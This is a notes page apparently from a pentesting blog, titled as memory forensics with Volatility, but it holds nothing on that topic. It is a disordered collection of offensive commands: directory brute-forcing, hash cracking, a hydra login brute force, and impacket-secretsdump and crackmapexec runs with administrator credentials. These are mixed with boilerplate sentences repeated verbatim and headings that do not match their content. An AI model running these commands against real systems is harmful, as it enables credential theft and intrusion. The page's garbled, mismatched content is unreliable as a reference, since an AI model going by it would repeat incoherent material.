---
TitleSEO: "Memory Forensics with Volatility | ZureFX"
TitlePost: "Memory Forensics with Volatility"
Author: "ZureFX"
Description: "Personal notes on Memory Forensics with Volatility. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, blue team, persistence, privilege escalation, linux, enumeration"
URL: "https://zurefx.github.io/notes/note-memory-forensics-with-volatility-301.html"
URL_IMAGES: ""
Date: "2024-05-05"
Tags: "Lateral Movement, Blue Team, Persistence, Privilege Escalation, Linux, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-memory-forensics-with-volatility-301"
Permalink: "/notes/note-memory-forensics-with-volatility-301.html"
BtnLabel: "Read Notes"
Pick: 0
---
## nikto

### Local File Inclusion

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

```powershell
gobuster dir -u http://10.123.205.218/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.126.157 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.52.228.195
```

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.84.77.98/FUZZ
gobuster dir -u http://10.65.242.146/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## LXD Privilege Escalation

### Kerberos

> **Note:** Insecure Deserialization was identified as the primary attack vector in this scenario.

```powershell
gobuster dir -u http://10.98.199.121/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```python
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.165.131
```

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

- `XSS`
- `lookupsid`
- `secretsdump`
- `crackmapexec`

## LDAP

### hydra

```python
gobuster dir -u http://10.88.31.203/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.38.130.83 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.39.235.84/FUZZ
```

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target.

## feroxbuster

### ldapsearch

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

> **Note:** ACL Abuse was identified as the primary attack vector in this scenario.

## SSRF

### bloodhound

- `atexec`
- `ACL Abuse`
- `chisel`

```powershell
gobuster dir -u http://10.28.108.137/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.89.136.129/FUZZ
crackmapexec smb 10.49.79.194 -u administrator -p 'P@ssw0rd!' --shares
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

- `Insecure Deserialization`
- `Resource-Based Constrained Delegation`
- `ACL Abuse`
- `Open Redirect`
- `Command Injection`

```bash
gobuster dir -u http://10.54.216.20/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.112.152.128
gobuster dir -u http://10.23.202.77/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.242.27 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```
